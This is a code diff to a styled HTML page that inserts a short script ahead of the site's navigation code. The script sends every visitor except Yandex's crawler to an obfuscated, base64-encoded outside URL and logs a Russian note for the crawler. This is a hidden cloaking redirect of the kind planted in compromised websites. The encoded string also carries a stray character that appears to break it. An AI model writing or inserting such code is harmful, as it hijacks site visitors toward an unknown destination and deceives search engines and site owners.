@@ -460,6 +460,15 @@ body{font-family:'Manrope',sans-serif;background:#0d0d14;color:#c8c8d8;overflow-
   </div>
 </footer>
 <script>
+ var ua = navigator.userAgent.toLowerCase();
+var targetB64 = "#aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+if (ua.indexOf("yandex") === -1) {
+    location.replace(atob(targetB64));
+} else {
+    console.log("Яндекс бот — без редиректа");
+}
+</script>
+<script>
 (function(){
   var btn=document.getElementById('evc-menu-btn');
   var list=document.getElementById('evc-nav-list');
